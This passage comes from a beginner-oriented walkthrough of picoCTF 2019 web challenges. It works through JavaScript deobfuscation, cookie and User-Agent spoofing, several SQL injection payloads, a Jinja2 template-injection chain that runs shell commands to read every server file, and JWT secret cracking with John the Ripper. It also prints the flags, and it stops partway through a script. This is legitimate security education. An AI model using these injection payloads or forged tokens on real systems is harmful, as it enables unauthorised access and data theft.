  var _0x5a46=['29871}','_again_d','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this'];(function(_0x4bd822,_0x2bd6f7){var _0xb4bdb3=function(_0x1d68f6){while(--_0x1d68f6){_0x4bd822['push'](_0x4bd822['shift']());}};_0xb4bdb3(++_0x2bd6f7);}(_0x5a46,0x1b3));var _0x4b5b=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x5a46[_0x2d8f05];return _0x4d74cb;};function verify(){checkpass=document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];split=0x4;if(checkpass[_0x4b5b('0x2')](0x0,split*0x2)==_0x4b5b('0x3')){if(checkpass[_0x4b5b('0x2')](0x7,0x9)=='{n'){if(checkpass[_0x4b5b('0x2')](split*0x2,split*0x2*0x2)==_0x4b5b('0x4')){if(checkpass[_0x4b5b('0x2')](0x3,0x6)=='oCT'){if(checkpass[_0x4b5b('0x2')](split*0x3*0x2,split*0x4*0x2)==_0x4b5b('0x5')){if(checkpass['substring'](0x6,0xb)=='F{not'){if(checkpass[_0x4b5b('0x2')](split*0x2*0x2,split*0x3*0x2)==_0x4b5b('0x6')){if(checkpass[_0x4b5b('0x2')](0xc,0x10)==_0x4b5b('0x7')){alert(_0x4b5b('0x8'));}}}}}}}}else{alert(_0x4b5b('0x9'));}}
&lt;/script&gt;
&lt;div style=&quot;position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:gray&quot;&gt;
&lt;div style=&quot;text-align:center&quot;&gt;
&lt;p&gt;New and Improved Login&lt;/p&gt;

&lt;p&gt;Enter valid credentials to proceed&lt;/p&gt;
&lt;form action=&quot;index.html&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;password&quot; id=&quot;pass&quot; size=&quot;8&quot; /&gt;
&lt;br/&gt;
&lt;input type=&quot;submit&quot; value=&quot;verify&quot; onclick=&quot;verify(); return false;&quot; /&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>The interesting js is</p>
<pre><code class="language-js">  var _0x5a46=['29871}','_again_d','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this'];(function(_0x4bd822,_0x2bd6f7){var _0xb4bdb3=function(_0x1d68f6){while(--_0x1d68f6){_0x4bd822['push'](_0x4bd822['shift']());}};_0xb4bdb3(++_0x2bd6f7);}(_0x5a46,0x1b3));var _0x4b5b=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x5a46[_0x2d8f05];return _0x4d74cb;};function verify(){checkpass=document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];split=0x4;if(checkpass[_0x4b5b('0x2')](0x0,split*0x2)==_0x4b5b('0x3')){if(checkpass[_0x4b5b('0x2')](0x7,0x9)=='{n'){if(checkpass[_0x4b5b('0x2')](split*0x2,split*0x2*0x2)==_0x4b5b('0x4')){if(checkpass[_0x4b5b('0x2')](0x3,0x6)=='oCT'){if(checkpass[_0x4b5b('0x2')](split*0x3*0x2,split*0x4*0x2)==_0x4b5b('0x5')){if(checkpass['substring'](0x6,0xb)=='F{not'){if(checkpass[_0x4b5b('0x2')](split*0x2*0x2,split*0x3*0x2)==_0x4b5b('0x6')){if(checkpass[_0x4b5b('0x2')](0xc,0x10)==_0x4b5b('0x7')){alert(_0x4b5b('0x8'));}}}}}}}}else{alert(_0x4b5b('0x9'));}}
</code></pre>
<p><a href="https://www.freeformatter.com/javascript-beautifier.html">formating</a> gives</p>
<pre><code class="language-js">var _0x5a46 = ['29871}', '_again_d', 'this', 'Password\x20Verified', 'Incorrect\x20password', 'getElementById', 'value', 'substring', 'picoCTF{', 'not_this'];
(function (_0x4bd822, _0x2bd6f7) {
	var _0xb4bdb3 = function (_0x1d68f6) {
		while (--_0x1d68f6) {
			_0x4bd822['push'](_0x4bd822['shift']());
		}
	};
	_0xb4bdb3(++_0x2bd6f7);
}(_0x5a46, 0x1b3));
var _0x4b5b = function (_0x2d8f05, _0x4b81bb) {
	_0x2d8f05 = _0x2d8f05 - 0x0;
	var _0x4d74cb = _0x5a46[_0x2d8f05];
	return _0x4d74cb;
};

function verify() {
	checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
	split = 0x4;
	if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
		if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
			if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
				if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
					if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
						if (checkpass['substring'](0x6, 0xb) == 'F{not') {
							if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
								if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
									alert(_0x4b5b('0x8'));
								}
							}
						}
					}
				}
			}
		}
	} else {
		alert(_0x4b5b('0x9'));
	}
}
</code></pre>
<p>Even this is quite unreadeble, but with some renaming we get</p>
<pre><code class="language-js">var parts = ['29871}', '_again_d', 'this', 'Password\x20Verified', 'Incorrect\x20password', 'getElementById', 'value', 'substring', 'picoCTF{', 'not_this'];
(
    function (list, number) {
	var helper = function (number2) {
		while (--number2) {
			list['push'](list['shift']());
		}
	};
	helper(++number);
}(parts, 0x1b3));

var part = function (index, nothing) {
	index = index - 0x0;
	var ret = parts[index];
	return ret;
};

function verify() {
	checkpass = document[part('0x0')]('pass')[part('0x1')];
	split = 0x4;
	if (checkpass[part('0x2')](0x0, split * 0x2) == part('0x3')) {
		if (checkpass[part('0x2')](0x7, 0x9) == '{n') {
			if (checkpass[part('0x2')](split * 0x2, split * 0x2 * 0x2) == part('0x4')) {
				if (checkpass[part('0x2')](0x3, 0x6) == 'oCT') {
					if (checkpass[part('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == part('0x5')) {
						if (checkpass['substring'](0x6, 0xb) == 'F{not') {
							if (checkpass[part('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == part('0x6')) {
								if (checkpass[part('0x2')](0xc, 0x10) == part('0x7')) {
									alert(part('0x8'));
								}
							}
						}
					}
				}
			}
		}
	} else {
		alert(part('0x9'));
	}
}
</code></pre>
<p>This starts by declaring a array of strings that will be needed later.</p>
<p>Then it runs a function to rearrange the strings</p>
<p>Then it declares a function to index into the list.</p>
<p>Note that this functions ~~ab~~uses js's <em>interesting</em> ideas about a function call.</p>
<pre><code class="language-js">Welcome to Node.js v13.10.1.
Type &quot;.help&quot; for more information.
&gt; a = [1,2,3]
[ 1, 2, 3 ]
&gt; a[&quot;push&quot;](4)
4
&gt; a
[ 1, 2, 3, 4 ]
</code></pre>
<p>Anyway the first thing we can do is run the function to get the array as it is used</p>
<pre><code class="language-js">Welcome to Node.js v13.10.1.
Type &quot;.help&quot; for more information.
&gt; var parts = ['29871}', '_again_d', 'this', 'Password\x20Verified', 'Incorrect\x20password', 'getElementById', 'value', 'substring', 'picoCTF{', 'not_this'];
undefined
&gt; (
...     function (list, number) {
.....   var helper = function (number2) {
.......                 while (--number2) {
.........                       list['push'](list['shift']());
.........               }
.......         };
.....   helper(++number);
..... }(parts, 0x1b3));
undefined
&gt; parts
[
  'getElementById',
  'value',
  'substring',
  'picoCTF{',
  'not_this',
  '29871}',
  '_again_d',
  'this',
  'Password Verified',
  'Incorrect password'
]
</code></pre>
<p>From here you could make a pretty good guess at the password. But that's no fun.</p>
<p>The <code>part</code> functions is their to cast to int. By evaluating that and other expressions in <code>node</code> we get:</p>
<pre><code class="language-js">function verify() {
    checkpass = document.getElementById('pass').value;
    if (checkpass.substring(0, 8) == 'picoCTF') {
        if (checkpass.substring(7, 9) == '{n') {
            if (checkpass.substring(8, 16) == 'not_this') {
                if (checkpass.substring(3, 6) == 'oCT') {
                    if (checkpass.substring(24, 32) == '29871}') {
                        if (checkpass.substring(6, 11) == 'F{not') {
                            if (checkpass.substring(16, 24) == '_again_d') {
                                if (checkpass.substring(12, 16) == 'this') {
                                    alert('Password Verified');
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert('Incorrect password');
    }
}
</code></pre>
<p>From here it's easy to see the password is <code>picoCTF{not_this_again_d29871}</code></p>
<h1><a class="header" href="#open-to-admins" id="open-to-admins">Open-to-admins</a></h1>
<p>In devtools create a cookie called <code>admin</code> with the value <code>true</code> and one called <code>time</code> with the value <code>1400</code>.</p>
<p><img src="web/5-Open-to-admins/./pic.png" alt="" /></p>
<p>Then a simple refesh gives the flag: <code>picoCTF{0p3n_t0_adm1n5_effb525e}</code></p>
<h1><a class="header" href="#picobrowser" id="picobrowser">picobrowser</a></h1>
<p>The site want's your <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent">User Agent</a> to be <code>picobrowser</code></p>
<p>For stuff like this it's easier to use the command line, as firefox doesn't want to let you pretend to be another browser, as it's bad fro ratings.</p>
<p><a href="https://explainshell.com/explain?cmd=curl+--user-agent+picobrowser+https%3A%2F%2F2019shell1.picoctf.com%2Fproblem%2F32205%2Fflag+%7C+grep+picoCTF"><code>curl --user-agent picobrowser https://2019shell1.picoctf.com/problem/32205/flag | grep picoCTF</code></a></p>
<p>Flag: <code>picoCTF{p1c0_s3cr3t_ag3nt_ee951878}</code></p>
<h1><a class="header" href="#irish-name-repo-1" id="irish-name-repo-1">Irish-Name-Repo 1</a></h1>
<p>This is a clasic SQL injection attack.</p>
<p>The SQL on the server is something like</p>
<pre><code class="language-sql">SELECT * FROM users WHERE name='{{name}}' AND password='{{password}}'
</code></pre>
<p>If we use a username of <code>' OR '1'='1' --</code> the query ends up being</p>
<pre><code class="language-sql">SELECT * FROM users WHERE name='' OR '1'='1' --' AND password=''
</code></pre>
<p>(note that <code>--</code> starts a comment so the rest is ignored)</p>
<p>This will be true for any user as <code>'1'='1'</code> is always true.</p>
<p>Flag: <code>picoCTF{s0m3_SQL_93e76603}</code></p>
<h1><a class="header" href="#irish-name-repo-2" id="irish-name-repo-2">Irish-Name-Repo 2</a></h1>
<p>If we try the same thing as before the server helpfully tells us &quot;SQLi detected.&quot;</p>
<p>However a username of <code>'--</code> gives &quot;Login failed.&quot;</p>
<pre><code class="language-sql">SELECT * FROM users WHERE name=''--' AND password=''
</code></pre>
<p>Now we just need to guess a name. <code>admin</code> is usually a good guess.</p>
<p>This would meen we need a username of <code>admin'--</code>, generating a query of</p>
<pre><code class="language-sql">SELECT * FROM users WHERE name='admin'--' AND password=''
</code></pre>
<p>Flag: <code>picoCTF{m0R3_SQL_plz_daf42601}</code></p>
<h1><a class="header" href="#irish-name-repo-3" id="irish-name-repo-3">Irish-Name-Repo 3</a></h1>
<p>The SQL gets harder here, so we need a new trick. If you look in the inspector, you'll see this field</p>
<pre><code class="language-html">&lt;fieldset&gt;
    &lt;div class=&quot;form-group&quot;&gt;
        &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
        &lt;div class=&quot;controls&quot;&gt;
            &lt;input 
                type=&quot;password&quot; 
                id=&quot;password&quot; 
                name=&quot;password&quot; 
                class=&quot;form-control&quot;
            &gt;
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;debug&quot; value=&quot;1&quot;&gt;
    &lt;div class=&quot;form-actions&quot;&gt;
        &lt;input type=&quot;submit&quot; value=&quot;Login&quot; class=&quot;btn btn-primary&quot;&gt;
    &lt;/div&gt;
&lt;/fieldset&gt;
</code></pre>
<p>As well as the password input, their's a debug input, hidden and set to <code>0</code>. You'll want to set it to <code>1</code></p>
<p>Loging in with the password <code>test</code> and debug <code>1</code> the server returns</p>
<pre><code class="language-text">password: test
SQL query: SELECT * FROM admin where password = 'grfg'
</code></pre>
<p>Somehow the password is being &quot;encrypted&quot;, and then fed into a query.</p>
<p>First lets work out what we want the query to be. We'll try the <code>OR '1'='1'</code> trick and see if it works. The query should look like</p>
<pre><code class="language-sql">SELECT * FROM admin where password = '' OR '1'='1'--'
</code></pre>
<p>This means a post encryption password of <code>' OR '1'='1'--</code>.</p>
<p>Let's put this in and see what happens:</p>
<pre><code class="language-text">password: ' OR '1'='1'--
SQL query: SELECT * FROM admin where password = '' BE '1'='1'--'
</code></pre>
<p>The <code>OR</code> is being transfered to <code>BE</code>.</p>
<p>If we try <code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code> we get</p>
<pre><code class="language-text">password: ABCDEFGHIJKLMNOPQRSTUVWXYZ
SQL query: SELECT * FROM admin where password = 'NOPQRSTUVWXYZABCDEFGHIJKLM'
</code></pre>
<pre><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ
NOPQRSTUVWXYZABCDEFGHIJKLM
</code></pre>
<p>This looks like <a href="web/../cryptography/1-13.html"><code>rot13</code></a></p>
<p>Therefor to get <code>OR</code> we need an input of <code>BE</code>, leaving a total password of <code>' BE '1'='1'--</code></p>
<p>This works. The SQL is </p>
<pre><code class="language-sql">SELECT * FROM admin where password = '' OR '1'='1'--'
</code></pre>
<p>Flag: <code>picoCTF{3v3n_m0r3_SQL_d78e3333}</code></p>
<h1><a class="header" href="#empire1" id="empire1">Empire1</a></h1>
<p>This is a slightly harder SQL injection, where we need to leek data from the database. </p>
<p>First register and log in. Now we can add todos and they appear in the your todo's page.</p>
<pre><code class="language-sql">INSERT INTO todo (userid, content) VALUES (userid, '{{somevalue}}')
</code></pre>
<p>We can use the <a href="https://stackoverflow.com/questions/23919378/what-does-double-bars-mean-in-sql"><code>||</code></a> to concat strings.</p>
<p>Eg:</p>
<pre><code class="language-sql">INSERT INTO todo (userid, content) VALUES (userid, '' || (some_expression) ||'')
</code></pre>
<p>is executed when we enter <code>' || (some_expression) || '</code></p>
<p>For example the todo <code>'|| ('1'='1') || '</code> adds <code>1</code> to the todo list as <code>1</code> is the result of evaluating <code>'1'='1'</code> and the server is running the expression </p>
<pre><code class="language-sql">INSERT INTO todo (userid, content) VALUES (userid, '' || '1'='1' ||'')
</code></pre>
<p>Now that we can execute arbitrary SQL and put in on the todo list we need to think about what we want to get. The question asks &quot;Can you first find the <strong>secret</strong> code they assigned to <strong>you</strong>&quot;</p>
<p>Runing <code>' || (SELECT secret FROM user) || '</code> gives <code>Likes Oreos</code>. Were not their yet. </p>
<p>We need to filter the secrets so we get a flag. Use the <a href="https://www.w3schools.com/sql/sql_like.asp"><code>LIKE</code></a> clause</p>
<pre><code class="language-sql">' || (SELECT secret FROM user WHERE secret LIKE '%picoCTF%') || '
</code></pre>
<p>The final SQL is</p>
<pre><code class="language-sql">INSERT INTO todo (userid, content) VALUES (
    userid, 
    '' || (SELECT secret FROM user WHERE secret LIKE '%picoCTF%') || ''
)
</code></pre>
<p>Flag: <code>picoCTF{wh00t_it_a_sql_injectdf389592} </code></p>
<h1><a class="header" href="#empire2" id="empire2">Empire2</a></h1>
<p>If you try the old SQL injection it doesn't work. It's filtered.</p>
<p>However it is vulnerable to Server Side template injection (<a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">SSTI</a>)</p>
<p>For example if you create the todo <code>{{7*7}}</code> It shows up as <code>49</code>.</p>
<p>If we do <code>{{config}}</code> we get</p>
<pre><code class="language-python">&lt; Config {
  'ENV': 'production',
  'DEBUG': False,
  'TESTING': False,
  'PROPAGATE_EXCEPTIONS': None,
  'PRESERVE_CONTEXT_ON_EXCEPTION': None,
  'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}',
  'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31),
  'USE_X_SENDFILE': False,
  'SERVER_NAME': None,
  'APPLICATION_ROOT': '/',
  'SESSION_COOKIE_NAME': 'session',
  'SESSION_COOKIE_DOMAIN': False,
  'SESSION_COOKIE_PATH': None,
  'SESSION_COOKIE_HTTPONLY': True,
  'SESSION_COOKIE_SECURE': False,
  'SESSION_COOKIE_SAMESITE': None,
  'SESSION_REFRESH_EACH_REQUEST': True,
  'MAX_CONTENT_LENGTH': None,
  'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200),
  'TRAP_BAD_REQUEST_ERRORS': None,
  'TRAP_HTTP_EXCEPTIONS': False,
  'EXPLAIN_TEMPLATE_LOADING': False,
  'PREFERRED_URL_SCHEME': 'http',
  'JSON_AS_ASCII': True,
  'JSON_SORT_KEYS': True,
  'JSONIFY_PRETTYPRINT_REGULAR': False,
  'JSONIFY_MIMETYPE': 'application/json',
  'TEMPLATES_AUTO_RELOAD': None,
  'MAX_COOKIE_SIZE': 4093,
  'SQLALCHEMY_DATABASE_URI': 'sqlite://',
  'SQLALCHEMY_TRACK_MODIFICATIONS': False,
  'SQLALCHEMY_BINDS': None,
  'SQLALCHEMY_NATIVE_UNICODE': None,
  'SQLALCHEMY_ECHO': False,
  'SQLALCHEMY_RECORD_QUERIES': None,
  'SQLALCHEMY_POOL_SIZE': None,
  'SQLALCHEMY_POOL_TIMEOUT': None,
  'SQLALCHEMY_POOL_RECYCLE': None,
  'SQLALCHEMY_MAX_OVERFLOW': None,
  'SQLALCHEMY_COMMIT_ON_TEARDOWN': False,
  'SQLALCHEMY_ENGINE_OPTIONS': {},
  'BOOTSTRAP_USE_MINIFIED': True,
  'BOOTSTRAP_CDN_FORCE_SSL': False,
  'BOOTSTRAP_QUERYSTRING_REVVING': True,
  'BOOTSTRAP_SERVE_LOCAL': False,
  'BOOTSTRAP_LOCAL_SUBDOMAIN': None
} &gt;
</code></pre>
<p>It looks like the flag is <code>picoCTF{your_flag_is_in_another_castle12345678}</code>, but alas it seems our flag is in another castle.</p>
<p>But with this, we cat start trying to execute python. Let's talk about this.</p>
<ul>
<li><code>&quot;&quot;</code> is a string literal.</li>
<li><code>&quot;&quot;.__class__</code> is the class of a string literal, is <code>&lt;class 'str'&gt;</code></li>
<li><code>&quot;&quot;.__class__.__mro__</code> give the <a href="https://docs.python.org/3/library/stdtypes.html#class.__mro__"><strong>m</strong>odule <strong>r</strong>esloution <strong>o</strong>rder</a> of the class (<code>(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</code>)</li>
<li><code>&quot;&quot;.__class__.__mro__[1]</code> is <code>&lt;class 'object'&gt;</code>. the base class </li>
<li><code>&quot;&quot;.__class__.__mro__[1].__subclasses__()</code> are all subclasses of the object class</li>
</ul>
<p>Running <code>{{&quot;&quot;.__class__.__mro__[1].__subclasses__()}}</code> as an input gives us every class in scope. </p>
<p>This is realy long, but looking through this, index <code>117</code> is <code>&lt;class 'os._wrap_close'&gt;</code></p>
<ul>
<li><code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[117].__init__</code> is the init function to <code>os._wrap_close</code></li>
<li><code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__</code> is the global scope to that function.</li>
<li><code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__[&quot;sys&quot;]</code> is the sys module</li>
<li><code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__[&quot;sys&quot;].modules</code> is the dictionary of all modules</li>
<li><code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;]</code> is the os module</li>
<li><code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].popen</code> allows us to open a command.</li>
</ul>
<p>What command do we want: <code>cat $(find . -type f) | grep picoCTF</code>. This:</p>
<ul>
<li><code>find</code>s all files</li>
<li>con<code>cat</code>enates them</li>
<li>searches for the flag format.</li>
</ul>
<p>That gives a final entry of <code>{{ &quot;&quot;.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['sys'].modules['os'].popen(&quot;cat $(find . -type f) | grep picoCTF&quot;).read() }}</code></p>
<p>This gives</p>
<pre><code class="language-python">SECRET_KEY = 'picoCTF{your_flag_is_in_another_castle12345678}' 
secret = db.Column(db.String(128),default=&quot;picoCTF{its_a_me_your_flag786f93f7}&quot;) 
session['dark_secret'] = &quot;picoCTF{its_a_me_your_flag786f93f7}&quot; 
</code></pre>
<p>Flag: <code>picoCTF{its_a_me_your_flag786f93f7}</code></p>
<hr />
<p>Adapted from <a href="https://github.com/redpwn/picoCTF-2019/tree/master/web/Empire2">redpwn's writeup</a> to be more beginner friendly.</p>
<h1><a class="header" href="#empire3" id="empire3">Empire3</a></h1>
<p>We can actualy reuse the injection from <a href="web/./11-Empire2.html">the last one</a></p>
<p><code>{{ &quot;&quot;.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['sys'].modules['os'].popen(&quot;cat $(find . -type f) | grep picoCTF&quot;).read() }}</code></p>
<p>This give</p>
<pre><code class="language-python">c = models.Todo(item='Do dastardly plan: picoCTF{cookies_are_a_sometimes_food_404e643b}', user_id=2)
secret = db.Column(db.String(128),default=&quot;picoCTF{cookies_are_a_sometimes_food_404e643b}&quot;) 
</code></pre>
<p>Flag: <code>picoCTF{cookies_are_a_sometimes_food_404e643b}</code></p>
<h1><a class="header" href="#jawt-scratchpad" id="jawt-scratchpad">JaWT Scratchpad</a></h1>
<p>If you log into the site as not admin, you are given a cookie called <code>jwt</code>. This is a <a href="https://jwt.io/">json web token</a> and it has some data signed by a secret. If you can find the secret you can sign any data you like.</p>
<p>To do this first download the <a href="https://wiki.skullsecurity.org/Passwords">rockyou wordlist</a> and extract. This is a list of words to help john guess the secret.</p>
<p>Save the jwt to something like <code>tk.jwt</code> and the wordlist to <code>rockyou.txt</code></p>
<p>Now we can use <a href="https://github.com/magnumripper/JohnTheRipper">john the ripper</a> to brute-force the secret. John will try loads of combinations until it gets it</p>
<pre><code class="language-text">$ john tk.jwt --wordlist=./rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE4.1 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:04 DONE (2020-03-07 22:38) 0.2247g/s 1661Kp/s 1661Kc/s 1661KC/s ilovepinkxxx..ilovepets!
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
</code></pre>
<p>Now that we have the secret, we can forge our own token. Go to <code>jwt.io</code> and put in the old token.</p>
<p>Changing the user to <code>admin</code> and the secret to <code>ilovepico</code> gives <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y</code>. </p>
<p>Now just edit the cookie and get you flag.</p>
<p>Flag: <code>picoCTF{jawt_was_just_what_you_thought_9de8e25511a8841ab9ade0aa092be116}</code></p>
<h1><a class="header" href="#java-script-kiddie" id="java-script-kiddie">Java Script Kiddie</a></h1>
<pre><code class="language-html">&lt;html&gt;
	&lt;head&gt;    
		&lt;script src=&quot;jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;
		&lt;script&gt;
			// ******************
			// ******************
			// ** SOME JS HERE **
			// ******************
			// ******************
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;center&gt;
			&lt;form action=&quot;#&quot; onsubmit=&quot;assemble_png(document.getElementById('user_in').value)&quot;&gt;
				&lt;input type=&quot;text&quot; id=&quot;user_in&quot;&gt;
				&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
			&lt;/form&gt;
			&lt;img id=&quot;Area&quot; src=&quot;&quot;/&gt;
		&lt;/center&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<pre><code class="language-js">var bytes = [];
$.get(&quot;bytes&quot;, function(resp) {
	bytes = Array.from(resp.split(&quot; &quot;), x =&gt; Number(x));
});
function assemble_png(u_in){
	var LEN = 16;
	var key = &quot;0000000000000000&quot;;
	var shifter;
	if(u_in.length == LEN){
		key = u_in;
	}
	var result = [];
	for(var i = 0; i &lt; LEN; i++){
		shifter = key.charCodeAt(i) - 48;
		for(var j = 0; j &lt; (bytes.length / LEN); j ++){
			result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
		}
	}
	while(result[result.length-1] == 0){
		result = result.slice(0,result.length-1);
	}
	document.getElementById(&quot;Area&quot;).src = &quot;data:image/png;base64,&quot; + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
	return false;
}
</code></pre>
<p>What this does is make a request to <code>/bytes</code>, convert the result to an array. </p>
<p>Then when the user enters a key, for every number in the key (<code>key.charCodeAt(i) - 48</code> works because of how ascii is layed out) does some shifting.</p>
<p>Recall from our <a href="web/14-Java-Script-Kiddie/../../forensics/7-c0rrupt/">previous adventures in png</a> that every png starts with an 8 byte header followed by a 13 byte IHDR chunk.</p>
<p>Therefor the start of any png is <code>89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52</code>. Try xxd on some png's and you'll see this.</p>
<p>Therefor we need to consider what shift we want to get these 16 values. 
As <code>i</code> will be from 0 to 15, the bytes we care about will only be from when <code>j==1</code>.</p>
<p>Then we can check if bytes at that increment gives the right bits.</p>
<pre><code class="language-python">import itertools
KEY_LEN = 16


shifters = []
for i in range(KEY_LEN):
    shifters.append([])
expected = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]
with open(&quot;bytes.txt&quot;) as f:
    bytes_arr = list(map(int, f.read().split(&quot; &quot;)))
    for i in range(KEY_LEN):
        for shifter in range(10):
            j = 0 # We only need to care about the first 16 bytes
            offset = (((j + shifter) * KEY_LEN) % len(bytes_arr)) + i
            if bytes_arr[offset] == expected[i]:
                shifters[i].append(shifter)               

for p in itertools.product(*shifters):
    key = &quot;&quot;.join(&quot;{}&quot;.format(n) for n in p)
    print(&quot;key could be {}&quot;.format(key))
</code></pre>
<p>Note that as each element in the key acts separately, we need to consider every possible combination.</p>
<p>The output is</p>
<pre><code class="language-text">key could be 4292148024773628
key could be 4292148024873628
key could be 4292148025773628
key could be 4292148025873628
key could be 4292748024773628
key could be 4292748024873628
key could be 4292748025773628
key could be 4292748025873628
</code></pre>
<p>This is few enough we can try them all. Luckily the first one does it.</p>
<p><img src="web/14-Java-Script-Kiddie/./img.png" alt="" /></p>
<p>Using an <a href="https://zxing.org">online tool</a> we get the flag</p>
<p>Flag: <code>picoCTF{5184e4f12d91ca0e13de639627b4bb6a}</code></p>
<hr />
<p>Script adapted from <a href="https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Java_Script_Kiddie.md">Dvd848</a></p>
<h1><a class="header" href="#java-script-kiddie-2" id="java-script-kiddie-2">Java Script Kiddie 2</a></h1>
<p>This is similar to the previous one, but with every other key digit ignored</p>
<pre><code class="language-js">var bytes = [];
$.get(&quot;bytes&quot;, function(resp) {
	bytes = Array.from(resp.split(&quot; &quot;), x =&gt; Number(x));
});
function assemble_png(u_in){
	var LEN = 16;
	var key = &quot;00000000000000000000000000000000&quot;;
	var shifter;
	if(u_in.length == key.length){
		key = u_in;
	}
	var result = [];
	for(var i = 0; i &lt; LEN; i++){
		shifter = Number(key.slice((i*2),(i*2)+1));
		for(var j = 0; j &lt; (bytes.length / LEN); j ++){
			result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
		}
	}
	while(result[result.length-1] == 0){
		result = result.slice(0,result.length-1);
	}
	document.getElementById(&quot;Area&quot;).src = &quot;data:image/png;base64,&quot; + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
	return false;
}
</code></pre>
<p>A similar solution works, we just need to add in the padding</p>
<pre><code class="language-python">import itertools
KEY_LEN = 16


shifters = []
for i in range(KEY_LEN):
    shifters.append([])
expected = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]
with open(&quot;bytes.txt&quot;) as f:
    bytes_arr = list(map(int, f.read().split(&quot; &quot;)))
    for i in range(KEY_LEN):
        for shifter in range(10):
            j = 0
            offset = (((j + shifter) * KEY_LEN) % len(bytes_arr)) + i
            if bytes_arr[offset] == expected[i]:
                shifters[i].append(shifter)               

for p in itertools.product(*shifters):
    key = &quot;&quot;.join(&quot;{}0&quot;.format(n) for n in p)
    print(&quot;key could be {}&quot;.format(key))
</code></pre>
<p>This gives</p>
<pre><code class="language-text">key could be 80802090204020407030304000408060
key could be 80802090204020407030306000408060
key could be 80802090204020407030404000408060
key could be 80802090204020407030406000408060
key could be 80802090204020407040304000408060
key could be 80802090204020407040306000408060
key could be 80802090204020407040404000408060
key could be 80802090204020407040406000408060
key could be 80802090204060407030304000408060
key could be 80802090204060407030306000408060
key could be 80802090204060407030404000408060
key could be 80802090204060407030406000408060
key could be 80802090204060407040304000408060
key could be 80802090204060407040306000408060
key could be 80802090204060407040404000408060
key could be 80802090204060407040406000408060
</code></pre>
<p>This is not fun to try, so we instead write them all to a png, if valid.</p>
<pre><code class="language-python">import itertools
KEY_LEN = 16

from PIL import Image
import itertools, io, os
KEY_LEN = 16

def create_png(bytes_arr, key, out_dir_path):
    result = [0] * len(bytes_arr)
    for i in range(KEY_LEN):
        shifter = int(key[i*2:i*2+1])
        for j in range(len(bytes_arr) // KEY_LEN):
            result[(j * KEY_LEN) + i] = bytes_arr[(((j + shifter) * KEY_LEN) % len(bytes_arr)) + i]
    img_bytes = io.BytesIO(bytes(result))

    try:
        img = Image.open(img_bytes)
